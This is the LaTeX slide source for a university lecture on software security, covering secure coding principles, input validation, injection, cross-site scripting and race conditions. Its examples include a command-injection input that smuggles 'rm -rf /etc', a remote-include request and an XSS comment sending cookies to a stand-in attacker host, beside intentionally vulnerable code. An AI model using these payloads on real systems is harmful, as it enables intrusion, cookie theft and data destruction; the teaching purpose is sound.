\documentclass{beamer}
\usetheme{Frankfurt}

\usepackage{listings}

\title{Software Security}
\subtitle{Lecture 14 \\ Computer Security DD2395}
\author[R. Guanciale]{
  Roberto Guanciale\\
  robertog@kth.se
}
\date{2015-12-14}
\begin{document}

\begin{frame}[plain]
  \titlepage
\end{frame}

\begin{frame}{Software Security}
  \begin{itemize}
    \item many vulnerabilities result from poor programming practises 
      \begin{itemize}
        \item SQL injection, buffer overflow, cross site scripting, \dots
      \end{itemize}
    \item often from insufficient checking / validation of
      program input 
    \item awareness of issues is critical 
  \end{itemize}
\end{frame}


\begin{frame}{Software Quality vs Security}
  \begin{itemize}
  \item software quality and reliability
    \begin{itemize}
    \item accidental failure of program
    \item from theoretically random unanticipated input
    \item improve using structured design and testing
    \item not how many bugs, but how often triggered
    \end{itemize}
  \item software security is related
    \begin{itemize}
    \item but attacker chooses input distribution, specifically
      targeting buggy code to exploit
    \item triggered by often very unlikely inputs
    \item which common tests don’t identify
    \end{itemize}
  \item software security = software quality/reliability + Murphy's law
  \end{itemize}
\end{frame}

\begin{frame}{Abstract Program Model}
  \begin{itemize}
  \item inputs
    \begin{itemize}
    \item keyboard, mouse
    \item DMBS, file system
    \item other processes
    \item OS, network
    \end{itemize}
  \item outputs
    \begin{itemize}
    \item display, printer
    \item \dots
    \end{itemize}
  \item interference
  \item when writing programs, developers focus on what is needed to
    solve the problem
  \end{itemize}
\end{frame}
 
\begin{frame}{OWASP Secure Coding Principles}
  \begin{itemize}
    \item Minimize attack surface area
      \begin{itemize}
      \item Every feature adds potential vulnerability
      \end{itemize}
    \item Establish secure defaults
      \begin{itemize}
      \item Out-of-the-box configuration safe, can be changed
      \end{itemize}
    \item Principle of Least privilege
      \begin{itemize}
      \item Only give minimum rights needed
      \end{itemize}
    \item Principle of Defense in depth
      \begin{itemize}
      \item Several walls of defense 
      \end{itemize}
  \end{itemize}
\end{frame}

\begin{frame}{OWASP Secure Coding Principles}
  \begin{itemize}
    \item Fail securely
    \item Don’t trust services
      \begin{itemize}
      \item Check input
      \end{itemize}
    \item Separation of duties
    \item Avoid security by obscurity
    \item Keep security simple
    \item Fix security issues correctly
      \begin{itemize}
      \item A change in one application might trickle to others, need
        to test all
      \end{itemize}
  \end{itemize}
\end{frame}

\begin{frame}{Defensive Programming}
  \begin{itemize}
    \item a form of defensive design to ensure continued
function of software despite unforeseen usage
    \item requires attention to all aspects of program
execution, environment, data processed
    \item also called secure programming
    \item assume nothing, check all potential errors
    \item rather than just focusing on solving task
    \item must validate all assumptions
  \end{itemize}
\end{frame}


\begin{frame}{Defensive Programming}
  \begin{itemize}
  \item No assumptions
  \item Reduce code complexity
  \item Source code reviews - by others
  \item Testing
  \item Reuse of secure components
  \item Check legacy and other people’s code 
  \end{itemize}
\end{frame}


\begin{frame}{Defensive Programming}
  \begin{itemize}
    \item To avoid bugs due to non-canonical input: canonicalization
    \item Avoid unchecked use of constant-size structures and
      functions for dynamic-size data
    \item Encrypt/authenticate all important data transmitted over
      networks
    \item Do not attempt to implement your own encryption scheme, but
      use a proven one instead
    \item All data is important until proven otherwise
    \item All data is tainted until proven otherwise
    \item All code is insecure until proven otherwise
    \item Never trust the client
    \item Verify that data are correct, not that they are incorrect
    \item Design by contract: uses preconditions, postconditions and invariants
    \item Assertions within functions
    \item Prefer exceptions to return codes
  \end{itemize}
\end{frame}







\begin{frame}{Security by Design}
  \begin{itemize}
  \item security and reliability common design goals in
    most engineering disciplines
    \begin{itemize}
    \item society not tolerant of bridge/plane etc failures
    \end{itemize}

  \item software development not as mature
    \begin{itemize}
    \item much higher failure levels tolerated
    \end{itemize}

  \item despite having a number of software
development and quality standards
    \begin{itemize}
    \item main focus is general development lifecycle
    \item increasingly identify security as a key goal
    \end{itemize}
  \end{itemize}
\end{frame}


\begin{frame}{Handling Program Input}
  \begin{itemize}
  \item incorrect handling a very common failing
  \item input is any source of data from outside
    \begin{itemize}
    \item data read from keyboard, file, network
    \item also execution environment, config data
    \end{itemize}
  \item must identify all data sources
  \item and explicitly validate assumptions on size and
type of values before use 
  \end{itemize}
\end{frame}

\begin{frame}{Input Size \& Buffer Overflow}
  \begin{itemize}
  \item often have assumptions about buffer size
    \begin{itemize}
    \item eg. that user input is only a line of text
    \end{itemize}
  \item size buffer accordingly but fail to verify size
    \begin{itemize}
    \item resulting in buffer overflow
    \end{itemize}
  \item testing may not identify vulnerability
    \begin{itemize}
    \item since focus on ``normal, expected'' inputs
    \end{itemize}
  \item safe coding treats all input as dangerous
    \begin{itemize}
    \item hence must process so as to protect program 
    \item check the size of input against size of allocated buffers
    \item check the size of requests to allocate new buffers
    \item check the result of allocation
    \end{itemize}
  \end{itemize}
\end{frame}


\begin{frame}{Interpretation of Input}
  \begin{itemize}
  \item program input may be binary or text
    \begin{itemize}
    \item binary interpretation depends on encoding and is
      usually application specific
    \item text encoded in a character set e.g. ASCII
    \item internationalization has increased variety
    \item also need to validate interpretation before use
    \end{itemize}
  \item failure to validate may result in an exploitable
vulnerability
  \end{itemize}
\end{frame}


\begin{frame}{Injection Attacks}
  \begin{itemize}
  \item flaws relating to invalid input handling which
then influences program execution
    \begin{itemize}
    \item often when passed as a parameter to a helper
program or other utility or subsystem
    \end{itemize}
  \item most often occurs in scripting languages
    \begin{itemize}
    \item encourage reuse of other programs / modules
    \item often seen in web CGI scripts
    \end{itemize}
  \end{itemize}
\end{frame}

\begin{frame}[fragile]{Insecure python CGI}
  \begin{verbatim}
#!/usr/bin/python
form = cgi.FieldStorage()
user = form["user"].value

call("/usr/bin/finger %s > res.txt" % user,\
 shell=True)

print """
<html><body>%s</body></html>
"""% open("res.txt", "r").read()

--------------------
input: guancio; rm -rf /etc
  \end{verbatim}
  
\end{frame}


\begin{frame}[fragile]{Safer Script}
  \begin{itemize}
  \item counter attack by validating input
    \begin{itemize}
    \item compare to pattern that rejects invalid input
    \item see example additions to script: 
    \end{itemize}
  \end{itemize}

  \begin{verbatim}
import re
...

user = form["user"].value

assert user == re.sub('[^\w]', '_', user), \
   "The specified user contains illegal characters!"
call("/usr/bin/finger %s > res.txt" % user,\
    shell=True)
  \end{verbatim}
\end{frame}

\begin{frame}[fragile]{More Safer Script}
  \begin{itemize}
  \item use secure API
  \item if \verb| shell=True| and args is a string, the string specifies the command to execute through the shell
  \end{itemize}

  \begin{verbatim}
...

res = Popen(["/usr/bin/finger", user]).stdout.read()
  \end{verbatim}
\end{frame}

\begin{frame}[fragile]{SQL Injection}
  \begin{itemize}
  \item another widely exploited injection attack
    \begin{itemize}
    \item when input used in SQL query to database
    \item similar to command injection
    \end{itemize}
  \item SQL meta-characters are the concern
  \item must check and validate input for these
  \end{itemize}

  \begin{verbatim}
name = REQUEST['name'];
query = "SELECT * FROM suppliers WHERE name = '" +
         name + "';"
result = c.execute(query);

query = "SELECT * FROM suppliers WHERE name = '" +
         escape_str(name) + "';"

c.execute("SELECT * FROM suppliers WHERE name = %s", name)
  \end{verbatim}
\end{frame}


\begin{frame}[fragile]{Script Code Injection}
  \begin{itemize}
  \item input includes code that is then executed
  \item PHP: variable + global field variables + remote include
  \item this type of attack is widely exploited
  \end{itemize}

  \begin{verbatim}
<?php
include $path . 'functions.php';
include $path . 'data/prefs.php';
...

GET /calendar/embed/day.php?path=\
       http://hacker.web.site/hack.txt?&cmd=ls
  \end{verbatim}
\end{frame}


\begin{frame}{Cross Site Scripting Attacks}
  \begin{itemize}
  \item attacks where input from one user is later
output to another user
  \item XSS commonly seen in scripted web apps
  \begin{itemize}
    \item with script code included in output to browser
    \item any supported script, e.g. Javascript, ActiveX
    \item assumed to come from application on site
  \end{itemize}
  \item XSS reflection
  \begin{itemize}
    \item malicious code supplied to site
    \item subsequently displayed to other users
  \end{itemize}
  \end{itemize}
\end{frame}

\begin{frame}[fragile]{XSS}
  \begin{itemize}
  \item cf. guestbooks, wikis, blogs etc
  \item where comment includes script code
  \begin{itemize}
    \item e.g. to collect cookie details of viewing users
  \end{itemize}
  \item need to validate data supplied
  \begin{itemize}
    \item including handling various possible encodings
  \end{itemize}
  \item attacks both input and output handling
  \item attack code can be encoded in ASCII, exadecimal or UTF-8
  \end{itemize}

\begin{verbatim}
Thanks for this information, its great!
<script>document.location=
 'http://hacker.web.site/cookie.cgi?'+
 document.cookie</script>
\end{verbatim}

\end{frame}


\begin{frame}{Validating Input Syntax}
  \begin{itemize}
  \item to ensure input data meets assumptions
  \begin{itemize}
    \item e.g. is printable, HTML, email, userid etc
    \item warning: XML lol, zip bomb, png bomb
  \end{itemize}
  \item compare to what is known acceptable
  \item not to known dangerous
  \begin{itemize}
    \item as can miss new problems, bypass methods
  \end{itemize}
  \item commonly use regular expressions
  \begin{itemize}
    \item pattern of characters describe allowable input
    \item details vary between languages
  \end{itemize}
  \item bad input either rejected or altered 
  \end{itemize}
\end{frame}

\begin{frame}{Alternate Encodings}
  \begin{itemize}
  \item may have multiple means of encoding text
  \begin{itemize}
    \item due to structured form of data, e.g. HTML
    \item or via use of some large character sets
  \end{itemize}
  \item Unicode used for internationalization
  \begin{itemize}
    \item uses 16-bit value for characters
    \item UTF-8 encodes as 1-4 byte sequences
  \end{itemize}
  \item have redundant variants
  \begin{itemize}
    \item e.g. / is 2F, C0 AF, E0 80 AF
    \item hence if blocking absolute filenames check all!
  \end{itemize}
  \item must canonicalize input before checking 
  \end{itemize}
\end{frame}



\begin{frame}{Validating Numeric Input}
  \begin{itemize}
  \item may have data representing numeric values
  \item internally stored in fixed sized value
  \begin{itemize}
    \item e.g. 8, 16, 32, 64-bit integers or 32, 64, 96 float
    \item signed or unsigned
  \end{itemize}
  \item must correctly interpret text form
  \item and then process consistently
  \begin{itemize}
    \item have issues comparing signed to unsigned
    \item e.g. large positive unsigned is negative signed
    \item could be used to thwart buffer overflow check 
  \end{itemize}
  \end{itemize}
\end{frame}



\begin{frame}{Input Fuzzing}
  \begin{itemize}
  \item powerful testing method using a large range of
randomly generated inputs
  \begin{itemize}
    \item to test whether program/function correctly handles
abnormal inputs
    \item simple, free of assumptions, cheap
    \item assists with reliability as well as security
  \end{itemize}
  \item can also use templates to generate classes of
known problem inputs
  \begin{itemize}
    \item could then miss bugs, so use random as well 
  \end{itemize}
  \item exhaustive search, two variables 32 bits, $2^{64}$ possible inputs
  \end{itemize}
\end{frame}


\begin{frame}{Writing Safe Program Code}
  \begin{itemize}
  \item next concern is processing of data by some
algorithm to solve required problem
  \item compiled to machine code or interpreted
  \begin{itemize}
    \item have execution of machine instructions
    \item manipulate data in memory and registers
  \end{itemize}
  \item security issues:
  \begin{itemize}
    \item correct algorithm implementation
    \item correct machine instructions for algorithm
    \item valid manipulation of data 
  \end{itemize}
  \end{itemize}
\end{frame}



\begin{frame}{Correct Algorithm Implementation}
  \begin{itemize}
  \item issue of good program development
  \item to correctly handle all problem variants
  \begin{itemize}
    \item c.f. Netscape/Debian random number bug
    \item TCP random sequence number enabling IP spoofing
    \item supposed to be unpredictable, but wasn’t
  \end{itemize}
  \item when debug/test code left in production
  \begin{itemize}
    \item used to access data or bypass checks
    \item c.f. Morris Worm exploit of sendmail
  \end{itemize}
  \item interpreter incorrectly handles semantics
  \item hence care needed in design/implement 
  \end{itemize}
\end{frame}

\begin{frame}{Correct Machine Language}
  \begin{itemize}
  \item ensure machine instructions correctly
    implement high-level language code
  \begin{itemize}
    \item often ignored by programmers
    \item assume compiler/interpreter is correct
    \item c.f. Ken Thompson’s paper, Reflections on Trusting Trust
  \end{itemize}
  \item requires comparing machine code with original
source
  \begin{itemize}
    \item slow and difficult
    \item is required for higher Common Criteria EAL’s
  \end{itemize}
  \end{itemize}
\end{frame}


\begin{frame}{Correct Data Interpretation}
  \begin{itemize}
  \item data stored as bits/bytes in computer
    \begin{itemize}
    \item grouped as words, longwords etc
    \item interpretation depends on machine instruction
    \end{itemize}
  \item languages provide different capabilities for
    restricting/validating data use
  \begin{itemize}
  \item strongly typed languages more limited, safer
  \item others more liberal, flexible, less safe e.g. C 
  \end{itemize}
  \end{itemize}
\end{frame}

\begin{frame}{Correct Use of Memory}
  \begin{itemize}
  \item issue of dynamic memory allocation
    \begin{itemize}
    \item used to manipulate unknown amounts of data
    \item allocated when needed, released when done
    \end{itemize}
\item memory leak occurs if incorrectly released
\item many older languages have no explicit support for
dynamic memory allocation
    \begin{itemize}
    \item rather use standard library functions
    \item programmer ensures correct allocation/release
    \end{itemize}
\item modern languages handle automatically
  \end{itemize}
\end{frame}





\begin{frame}{Race Conditions in Shared Memory}
  \begin{itemize}
  \item when multiple threads/processes access shared
    data / memory
  \item unless access synchronized can get corruption
    or loss of changes due to overlapping accesses
  \item so use suitable synchronization primitives
    \begin{itemize}
    \item correct choice \& sequence may not be obvious
    \end{itemize}
  \item have issue of access deadlock 
  \end{itemize}
\end{frame}

\begin{frame}{Interacting with O/S}
  \begin{itemize}
  \item programs execute on systems under O/S
    \begin{itemize}  
    \item mediates and shares access to resources    
    \item constructs execution environment
    \item with environment variables and arguments
    \end{itemize}
  \item systems have multiple users
    \begin{itemize}
    \item with access permissions on resources / data
    \end{itemize}
  \item programs may access shared resources
    \begin{itemize}
    \item e.g. files
    \end{itemize}
  \end{itemize}
\end{frame}


\begin{frame}{Environment Variables}
  \begin{itemize}
  \item set of string values inherited from parent
    \begin{itemize}  
    \item can affect process behavior
    \item e.g. PATH, IFS, LD\_LIBRARY\_PATH
    \end{itemize}
  \item process can alter for its children
  \item another source of untrusted program input
  \item attackers use to try to escalate privileges
  \item privileged shell scripts targeted
    \begin{itemize}  
    \item very difficult to write safely and correctly
    \end{itemize}
  \end{itemize}
\end{frame}


\begin{frame}[fragile]{Example Vulnerable Scripts}
  \begin{itemize}
  \item using PATH or IFS environment variables
  \item cause script to execute attackers program
  \item with privileges granted to script
  \item almost impossible to prevent in some form
  \end{itemize}
\begin{verbatim}
#!/bin/bash
user=`echo $1 | sed 's/@.*$//'`
grep $user /var/local/accounts/ipaddrs
\end{verbatim}

\begin{verbatim}
#!/bin/bash
PATH=”/sbin:/bin:/usr/sbin:/usr/bin”
export PATH
user=`echo $1 | sed 's/@.*$//'`
grep $user /var/local/accounts/ipaddrs
\end{verbatim}

\end{frame}

\begin{frame}{Vulnerable Compiled Programs}
  \begin{itemize}
  \item if invoke other programs can be vulnerable to
    PATH variable manipulation 
  \begin{itemize}
  \item must reset to ``safe'' values
  \end{itemize}
\item if dynamically linked may be vulnerable to
  manipulation of LD\_LIBRARY\_PATH
  \begin{itemize}
  \item used to locate suitable dynamic library
  \item must either statically link privileged programs
  \item or prevent use of this variable 
  \end{itemize}
  \end{itemize}
\end{frame}



\begin{frame}{Use of Least Privilege}
  \begin{itemize}
  \item exploit of flaws may give attacker greater
privileges - privilege escalation
\item  hence run programs with least privilege needed
to complete their function
  \begin{itemize}
  \item determine suitable user and group to use
  \item whether grant extra user or group privileges
  \begin{itemize}
  \item  latter preferred and safer, may not be sufficient
  \end{itemize}
\item ensure can only modify files/dirs needed
  \begin{itemize}
  \item  otherwise compromise results in greater damage
  \item  recheck these when moved or upgraded
  \end{itemize}
  \end{itemize}
  \end{itemize}
\end{frame}

\begin{frame}{Root/Admin Programs}
  \begin{itemize}
  \item programs with root / administrator privileges a
major target of attackers
  \begin{itemize}
  \item since provide highest levels of system access
  \item are needed to manage access to protected system
resources, e.g. network server ports
  \end{itemize}
\item  often privilege only needed at start
  \begin{itemize}
  \item can then run as normal user
  \end{itemize}
\item good design partitions complex programs in
smaller modules with needed privileges 
\item confinement: JVM, chroot, KVM, Virtualization, \dots
  \end{itemize}
\end{frame}


\begin{frame}{System Calls and Standard Library Functions}
  \begin{itemize}
  \item programs use system calls and standard library
    functions for common operations
    \begin{itemize}
    \item and make assumptions about their operation
    \item if incorrect behavior is not what is expected
    \item may be a result of system optimizing access to
      shared resources
      \begin{itemize}
      \item by buffering, re-sequencing, modifying requests
      \end{itemize}
    \item can conflict with program goals 
    \end{itemize}
  \end{itemize}
\end{frame}


\begin{frame}[fragile]{Secure File Shredder}
  \begin{verbatim}
patterns = [10101010, 01010101, 11001100, ... ]
open file for writing
for each pattern
 seek to start of file
 overwrite file contents with pattern
close file
remove file
  \end{verbatim}
\begin{verbatim}
patterns = [10101010, 01010101, 11001100, ... ]
open file for update
for each pattern
 seek to start of file
 overwrite file contents with pattern
 flush application write buffers
 sync file system write buffers with device
close file
remove file
\end{verbatim}
\end{frame}




\begin{frame}{Race Conditions}
  \begin{itemize}
  \item programs may access shared resources
    \begin{itemize}
    \item e.g. mailbox file, CGI data file
    \end{itemize}
  \item need suitable synchronization mechanisms
    \begin{itemize}
    \item e.g. lock on shared file
    \end{itemize}
  \item alternatives
    \begin{itemize}
    \item  lockfile - create/check, advisory, atomic
    \item  advisory file lock - e.g. flock
    \item  mandatory file lock - e.g. fcntl, need release
      \begin{itemize}
      \item later mechanisms vary between O/S
      \item have subtle complexities in use 
      \end{itemize}
    \end{itemize}
  \end{itemize}
\end{frame}


\begin{frame}{Safe Temporary Files}
  \begin{itemize}
  \item  many programs use temporary files
  \item  often in common, shared system area
  \item  must be unique, not accessed by others
  \item  commonly create name using process ID
    \begin{itemize}
    \item unique, but predictable
    \item attacker might guess and attempt to create own
    \end{itemize}
    between program checking and creating
  \item secure temp files need random names
    \begin{itemize}
    \item some older functions unsafe
    \item must need correct permissions on file/dir 
    \end{itemize}
  \end{itemize}
\end{frame}


\begin{frame}{Other Program Interaction}
  \begin{itemize}
  \item may use services of other programs
  \item must identify/verify assumptions on data
  \item esp older user programs
    \begin{itemize}
    \item now used within web interfaces
    \item must ensure safe usage of these programs
    \end{itemize}
  \item issue of data confidentiality / integrity
    \begin{itemize}
    \item within same system use pipe / temp file
    \item across net use IPSec, TLS/SSL, SSH etc
    \end{itemize}
  \item also detect / handle exceptions / errors
  \end{itemize}
\end{frame}


\begin{frame}{Handling Program Output}
  \begin{itemize}
  \item final concern is program output
    \begin{itemize}
    \item stored for future use, sent over net, displayed
    \item may be binary or text
    \end{itemize}
  \item conforms to expected form / interpretation
    \begin{itemize}
    \item assumption of common origin,
    \item c.f. XSS, VT100 escape seqs, X terminal hijack
    \end{itemize}
  \item uses expected character set
  \item target not program but output display device 
  \end{itemize}
\end{frame}



\end{document}

%%% Local Variables: 
%%% mode: latex
%%% TeX-master: t
%%% End: 
